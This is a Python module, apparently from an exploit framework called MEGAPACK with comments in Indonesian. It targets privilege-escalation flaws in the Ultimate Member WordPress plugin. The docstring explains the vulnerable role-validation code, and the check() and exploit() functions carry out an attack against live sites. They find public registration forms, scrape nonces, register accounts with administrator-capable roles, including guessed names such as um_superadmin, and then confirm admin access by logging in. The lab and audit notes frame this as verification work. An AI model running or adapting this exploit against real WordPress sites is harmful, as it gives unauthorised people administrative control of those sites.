#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ultimate Member — modul MEGAPACK.

CVE-2026-12251 (<= 2.12.0) — unauth role escalation (admin-capable role selectable)
    includes/core/class-roles-capabilities.php :: get_editable_user_roles()
    2.12.0 mengembalikan array('subscriber') + 'um_'<key> untuk setiap key di option
    `um_roles`, TANPA menyaring role yang punya capability administratif. Hanya
    `administrator` bawaan WP yang terbuang (lewat $exclude_roles = semua role WP
    dikurangi hasil fungsi ini).
    Fix 2.13.0 menambahkan:
        $banned = UM()->common()->secure()->get_banned_capabilities_list();
        unset role jika $role->has_cap($cap) untuk salah satu $cap.
    Lab: role `um_superadmin` (manage_options) tampil sebagai opsi radio di form
    registrasi publik dan dapat dipilih attacker -> akun dengan manage_options=true.

CVE-2026-19423 (<= 2.12.0) — role selectable dari form sendiri, bukan allowlist form
    includes/core/class-form.php
        $custom_field_roles = $this->custom_field_roles( $this->form_data['custom_fields'] );
        if ( ! empty( $custom_field_roles ) && ! empty( $this->post_form['role'] ) ) { ... }
    Bila $custom_field_roles TIDAK kosong, nilai POST `role` hanya dicek thd
    $custom_field_roles (= nama role yang tersedia di site, hasil irisan options form
    dengan $wp_roles->role_names) dan $exclude_roles. Karena $exclude_roles memakai
    get_editable_user_roles() yang (di 2.12.0) tidak memfilter role ber-cap admin,
    role kustom ber-cap administratif LULUS -> $maybe_set_default_role = false ->
    um-actions-register.php memakai $args['role'] apa adanya:
        if ( ! in_array( $args['role'], $exclude_roles, true ) ) { $user_role = $args['role']; }
    Fix 2.13.0: bila $custom_field_roles kosong tapi `role` dikirim -> wp_die().

CVE-2026-96451 (<= 2.13.1) — authorization bypass via user-controlled key
    TRIASE 2026-11-08: source 2.13.0 & 2.13.1 ADA di lab (catatan lama salah).
    Versi fix (2.13.2) tidak tersedia -> jalur spesifik belum bisa dipastikan;
    jalur CWE-639 yang jelas di 2.13.1 sudah dijaga. Status tetap `documented`.

Prasyarat (unauth):
  1. form registrasi UM publik yang memuat field `role_radio`/`role_select`
     (metakey role_radio / role_select) dengan option role ber-cap administratif.
  2. nonce `_wpnonce` dari halaman form itu (tercetak di HTML).
  3. POST ke halaman form: user_login-<fid>, user_email-<fid>, user_password-<fid>,
     confirm_user_password-<fid>, role=<role-berbahaya>.
"""
from __future__ import annotations

import re

from mp import (CveModule, ST_CLEAN, ST_INFO, ST_PWN, ST_SKIP, ST_UNKNOWN, ST_VULN, detect_platform, plugin_installed, plugin_version, rand, register, ver_le)

SLUG = "ultimate-member"
VULN_MAX = "2.12.0"   # CVE-2026-12251 + CVE-2026-19423
VULN_KEY = "2.13.1"   # CVE-2026-96451

ADMIN_CAPS = ("manage_options", "activate_plugins", "install_plugins",
              "edit_users", "edit_theme_options", "promote_users", "delete_users")

# Nama opsi form yang dicari di HTML (input radio role)
FORM_ID_RE = re.compile(r'name="form_id"\s+id="form_id_(\d+)"\s+value="(\d+)"')
NONCE_RE = re.compile(r'name="_wpnonce"\s+value="([a-f0-9]{8,12})"')
ROLE_OPT_RE = re.compile(r'name="role"[^>]*>|<option[^>]*value="([a-z0-9_-]+)"', re.I)


def _vstr(v) -> str:
    return ".".join(str(x) for x in v) if isinstance(v, tuple) else str(v)


def _form_pages(t, h, limit: int = 60):
    """
    Halaman WP yang memuat form UM registrasi: balik (url, form_id, nonce, roles).
    roles = set nama role yang muncul sebagai opsi pada input role form.
    """
    found = []
    seen = set()
    cands = ["/"]
    # REST dulu (murah, hanya halaman yang benar-benar ada)
    r = h.get(f"{t.url}/?rest_route=/wp/v2/pages&per_page=100&_fields=id,link")
    if r is not None and r.status_code == 200:
        try:
            ids = [pg.get("id") for pg in r.json() if pg.get("id")]
            cands += [f"/?page_id={pid}" for pid in ids]
        except Exception:
            pass
    if len(cands) == 1:
        cands += [f"/?page_id={i}" for i in range(1, limit)]
    for p in cands:
        rr = h.get(f"{t.url}{p}")
        if rr is None or rr.status_code != 200:
            continue
        if "um-form" not in rr.text and "ultimatemember" not in rr.text:
            continue
        m = FORM_ID_RE.search(rr.text)
        if not m:
            continue
        fid = m.group(2)
        if fid in seen:
            continue
        seen.add(fid)
        n = NONCE_RE.search(rr.text)
        roles = set(re.findall(r'name="role"[^>]*value="([a-z0-9_-]+)"', rr.text, re.I))
        roles |= set(re.findall(r'<input[^>]*name="role"[^>]*>', rr.text, re.I) and [])
        # juga ambil value dari radio/select ber-name role
        for blk in re.findall(r'name="role".{0,400}?</(?:select|ul|div)>', rr.text, re.S | re.I):
            roles |= set(re.findall(r'value="([a-z0-9_-]+)"', blk, re.I))
        found.append((p, fid, n.group(1) if n else None, sorted(roles), rr.text))
    return found


def _register(t, h, page: str, fid: str, nonce: str, role: str,
              suffix: str | None = None, password: str = "Megapack!2345"):
    """
    Kirim registrasi UM dengan role terpilih.
    Return (status, detail) dgn status salah satu:
      'created'  - akun terbentuk (dibuktikan dgn login memakai password)
      'exists'   - username sudah dipakai
      'rejected' - Umum menolak (pesan error di halaman)
      'invalid'  - nonce/gate gagal
    """
    tag = suffix or rand(6)
    login = f"mpx{tag}"
    data = {
        "form_id": fid,
        "um_request": "",
        "_wpnonce": nonce,
        f"user_login-{fid}": login,
        f"user_email-{fid}": f"{login}@megapack.local",
        f"user_password-{fid}": password,
        f"confirm_user_password-{fid}": password,
        "role": role,
    }
    r = h.post(f"{t.url}{page}", data=data, headers={"Referer": f"{t.url}{page}"})
    if r is None:
        return ("none", login)
    body = r.text or ""
    low = body.lower()
    if "already registered" in low or "already exists" in low or "username is already" in low:
        return ("exists", login)
    if "this is not possible for security reasons" in low:
        return ("rejected", "wp_die security guard (versi sudah diperbaiki?)")
    if "um-error" in low or "error-msg" in low or "validation" in low and "failed" in low:
        return ("rejected", "form menolak: " + _err_snippet(body))
    # verifikasi objektif: coba login dgn kredensial yg baru dibuat
    if _login_ok(t, h, login, password):
        return ("created", login)
    if r.status_code in (301, 302, 303):
        return ("created", f"redirect -> {r.headers.get('Location','')}")
    return ("unconfirmed", _err_snippet(body))


def _err_snippet(body: str) -> str:
    m = re.search(r'<div[^>]*class="[^"]*um-[^"]*(?:error|notice)[^"]*"[^>]*>(.{0,200}?)</div>',
                  body, re.S | re.I)
    if m:
        return re.sub(r"\s+", " ", re.sub(r"<[^>]+>", "", m.group(1))).strip()[:180]
    m = re.search(r"(?:Error|Validation failed)[^<]{0,160}", body)
    return m.group(0)[:180] if m else "(tanpa pesan)"


def _login_ok(t, h, login: str, password: str) -> bool:
    """Login via wp-login.php dan cek cookie wordpress_logged_in."""
    rr = h.get(f"{t.url}/wp-login.php")
    nonce = None
    if rr is not None:
        _m = NONCE_RE.search(rr.text)
        if _m:
            nonce = _m.group(1)
    data = {
        "log": login,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": f"{t.url}/wp-admin/",
        "testcookie": "1",
    }
    if nonce:
        data["_wpnonce"] = nonce
    r = h.post(f"{t.url}/wp-login.php", data=data,
               headers={"Referer": f"{t.url}/wp-login.php"})
    if r is None:
        return False
    # cookie di-set pada respons ini ATAU sudah ada di session jar (redirect antar host)
    names = [c.name for c in r.cookies]
    try:
        names += [c.name for c in h.s.cookies]
    except Exception:
        pass
    return any("wordpress_logged_in" in (n or "") for n in names)


def _admin_capable(t, h, login: str, password: str = "Megapack!2345"):
    """
    Bukti capability, bukan asumsi dari nama role: login ulang sebagai akun target,
    lalu minta /wp-admin/options-general.php (butuh manage_options; role lain -> 403).
    Jangan mengandalkan frasa 'not allowed' — string i18n JS admin memuatnya.
    """
    if not _login_ok(t, h, login, password):
        return False, "login ulang gagal (sesi tidak terpasang)"
    r = h.get(f"{t.url}/wp-admin/options-general.php")
    if r is None:
        return False, "options-general.php tidak dapat diakses (jaringan)"
    if r.status_code in (301, 302, 303):
        return False, f"options-general.php redirect -> {r.headers.get('Location', '')}"
    low = (r.text or "").lower()
    if r.status_code != 200:
        return False, f"options-general.php status {r.status_code} (butuh manage_options)"
    if "options-general" in low:
        return True, "options-general.php terbuka (status 200) — capability admin terbukti"
    return False, f"options-general.php status {r.status_code} tanpa penanda halaman"


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "wordpress":
        return ST_SKIP, "bukan WordPress", f"platform={plat}"
    if not plugin_installed(t, h, SLUG):
        return ST_CLEAN, "Ultimate Member tidak terpasang", ""
    ver = plugin_version(t, h, SLUG)
    if ver is None:
        return ST_INFO, "Ultimate Member terpasang; versi tidak terbaca (perlu --exploit)", ""
    vs = _vstr(ver)
    vuln = ver_le(ver, tuple(int(x) for x in VULN_MAX.split(".")))
    if not vuln:
        return ST_CLEAN, f"Ultimate Member {vs} (>= 2.13.0, sudah diperbaiki)", ""

    pages = _form_pages(t, h)
    if not pages:
        return (ST_UNKNOWN,
                f"Ultimate Member {vs}; tidak ada halaman form UM yang dapat "
                f"diidentifikasi sebagai form registrasi", "")

    # cari form yang mengekspos role administratif
    risky = []
    for page, fid, nonce, roles, _html in pages:
        for role in roles:
            if role in ("administrator",):
                continue
            if role.startswith("um_") or role not in ("subscriber", "subscriber_"):
                risky.append((page, fid, nonce, role))
    if risky:
        p, fid, n, role = risky[0]
        return (ST_INFO,
                f"Ultimate Member {vs}; form registrasi {fid} di {p} mengekspos "
                f"role '{role}' sebagai opsi; nonce={'ada' if n else 'tidak ada'}; "
                f"{len(risky)} kandidat role non-default", f"{p} role={role}")
    return (ST_INFO,
            f"Ultimate Member {vs}; {len(pages)} halaman form UM ditemukan "
            f"(role administratif tidak terlihat di HTML; tetap dapat diuji dgn --username-role)", "")


def exploit(t, h, opts):
    ver = plugin_version(t, h, SLUG)
    if ver is None:
        return ST_SKIP, "versi tidak terbaca", ""
    if not ver_le(ver, tuple(int(x) for x in VULN_MAX.split("."))):
        return ST_SKIP, f"versi {_vstr(ver)} tidak rentan untuk chain ini", ""

    pages = _form_pages(t, h)
    if not pages:
        return ST_SKIP, "halaman form UM registrasi tidak ditemukan", ""

    # role target: dari --username-role (opsi baru), default um_ -kandidat pertama
    want_role = getattr(opts, "username_role", None)
    tried = []
    for page, fid, nonce, roles, _html in pages:
        if not nonce:
            tried.append(f"{fid}: nonce tidak ditemukan")
            continue
        candidates = []
        if want_role:
            candidates.append((want_role, "operator"))
        # kandidat dari HTML: role selain subscriber
        candidates += [(r, "form") for r in roles if r not in ("subscriber", "administrator")]
        # fallback: role kustom umum (TIDAK ada di form -> membuktikan role dari POST
        # tidak divalidasi terhadap allowlist form = CVE-2026-19423)
        candidates += [(r, "tebakan-non-form") for r in ("um_admin", "um_superadmin", "um_moderator")]
        seen = set()
        for role, src in candidates:
            if not role or role in seen:
                continue
            seen.add(role)
            st, detail = _register(t, h, page, fid, nonce, role)
            if st == "created":
                # provenance menentukan CVE mana yang benar-benar dibuktikan:
                #   sumber=form          -> role administratif DITAWARKAN form (CVE-2026-12251)
                #   sumber=tebakan-non-form -> role dikirim tapi tak ada di form (CVE-2026-19423)
                cap, cap_ev = _admin_capable(t, h, detail)
                meta = (f"role={role} sumber_role={src} login={detail} "
                        f"admin={cap} page={page} fid={fid}")
                if cap:
                    return (ST_PWN,
                            f"PWN: akun '{detail}' dibuat via form {fid} dengan role "
                            f"'{role}' (sumber role: {src}); CAPABILITY ADMIN TERBUKTI "
                            f"-> {cap_ev}",
                            meta)
                return (ST_VULN,
                        f"akun '{detail}' dibuat via form {fid} dengan role '{role}' "
                        f"(sumber role: {src}) tetapi CAPABILITY ADMIN TIDAK TERBUKTI: "
                        f"{cap_ev}",
                        meta)
            tried.append(f"{fid}/{role}[{src}]: {st} {str(detail)[:70]}")
    return (ST_VULN,
            f"registrasi role administratif tidak terkonfirmasi; percobaan: "
            f"{'; '.join(tried[:4])}", "")


def register_all():
    register(CveModule(
        cve="CVE-2026-12251", cluster="wordpress",
        title="Ultimate Member <= 2.12.0 unauth admin-capable role registration",
        vclass="privesc", cvss="9.8", severity="critical", cwe="CWE-269",
        product="Ultimate Member", versions_affected="<= 2.12.0",
        status="verified", check=check, exploit=exploit,
        notes="get_editable_user_roles() tidak memfilter role ber-capability "
              "administratif dari option `um_roles` -> role kustom (mis. um_superadmin "
              "dgn manage_options) tampil sebagai opsi di form registrasi publik. "
              "Fix 2.13.0 memakai get_banned_capabilities_list(). Bukti lab: "
              "current_user_can('manage_options')=true utk akun hasil registrasi. "
              "AUDIT 2026-11-08 — bukti capability kini NYATA, bukan asumsi: exploit() "
              "mencatat provenance role (sumber_role=form|tebakan-non-form|operator) dan "
              "memanggil _admin_capable() (GET /wp-admin/options-general.php; harus 200 "
              "tanpa redirect + penanda halaman). PWN hanya bila capability terbukti. "
              "CATATAN ENVIRONMENT lab 8100: akun hasil exploit MEMANG mendapat WP role "
              "um_superadmin (DB wp_capabilities) dan role itu punya manage_options=1 "
              "(DB wp_user_roles), status akun 'approved', login berhasil — tetapi sesi "
              "di-redirect dari wp-admin (302 -> beranda) oleh konfigurasi situs, jadi tool "
              "melaporkan VULN (capability tak terkonfirmasi jarak jauh), bukan PWN. Di lab "
              "PB (8102) tanpa restriksi itu, probe yang sama memberi PWN + bukti.",
    ))
    register(CveModule(
        cve="CVE-2026-19423", cluster="wordpress",
        title="Ultimate Member <= 2.12.0 role dari form tak divalidasi thd allowlist",
        vclass="privesc", cvss="9.8", severity="critical", cwe="CWE-269",
        product="Ultimate Member", versions_affected="<= 2.12.0",
        status="documented", check=check, exploit=exploit,
        notes="class-form.php: bila $custom_field_roles tidak kosong, nilai POST `role` "
              "hanya dicek thd nama role terdaftar site (bukan allowlist form); bila "
              "kosong, $maybe_set_default_role tetap true dan role ditimpa default. "
              "Fix 2.13.0 memanggil wp_die() saat role dikirim tanpa field role. "
              "AUDIT 2026-11-08 -> status diturunkan dari 'verified' ke 'documented': "
              "exploit() bersama mencoba role dari HTML form lebih dulu, jadi bila form "
              "menawarkan role non-default (kasus lab 2.12.0: um_superadmin) yang "
              "berhasil adalah vektor CVE-2026-12251 (`sumber_role=form`), dan mekanisme "
              "CVE ini (role yang TIDAK ada di form tetap diterima) tidak pernah "
              "dieksekusi. Bukti kini mencantumkan `sumber_role`; PWN dgn "
              "`sumber_role=tebakan-non-form` = bukti 19423. Perlu urutan kandidat "
              "yang sadar-CVE (butuh framework meneruskan CVE yang diminta) atau lab "
              "yg form-nya tanpa role non-default, sebelum kembali 'verified'.",
    ))
    register(CveModule(
        cve="CVE-2026-96451", cluster="wordpress",
        title="Ultimate Member <= 2.13.1 authorization bypass via user-controlled key",
        vclass="privesc", cvss="8.8", severity="high", cwe="CWE-639",
        product="Ultimate Member", versions_affected="<= 2.13.1",
        status="documented", check=check, exploit=None,
        notes=("TRIASE 2026-11-08. Source 2.13.0 & 2.13.1 JUSTRU ADA di lab "
              "(src/um-2.13.0, src/um-2.13.1) — catatan lama salah. Yang TIDAK "
              "tersedia adalah versi fix (um-2.13.2 kosong; um-2.13.2.zip = 9 byte "
              "'Not found'), jadi diff perbaikan tak bisa dilihat. Changelog: "
              "2.13.0 memfix role-field privesc (19423), role dropdown "
              "manage_options (12251), komentar menunggu moderasi, CVE-2026-4248, "
              "CVE-2026-18547; 2.13.1 memfix stored XSS via nama profil — TIDAK "
              "ADA entri yang cocok dgn 'authorization bypass via user-controlled "
              "key'. Jalur CWE-639 yang paling jelas di 2.13.1 SUDAH dijaga: "
              "um_remove_file -> UM()->roles()->um_current_user_can('edit',$user_id); "
              "um_ajax_paginate_posts/load_comments -> um_can_view_profile($author) "
              "+ query hanya publish/approve. Jadi belum dapat dikonfirmasi maupun "
              "dibantah; JANGAN dinaikkan ke unsupported. Kandidat akar masalah "
              "yang tersisa: pola um_fetch_user() global di um_current_user_can() "
              "(menyetel $temp_id tapi tidak memulihkannya). GAP TERPISAH: vendor "
              "menyebut CVE-2026-4248 & CVE-2026-18547 di changelog 2.13.0, "
              "keduanya TIDAK ada di cve-list.txt maupun di megapack."),
    ))
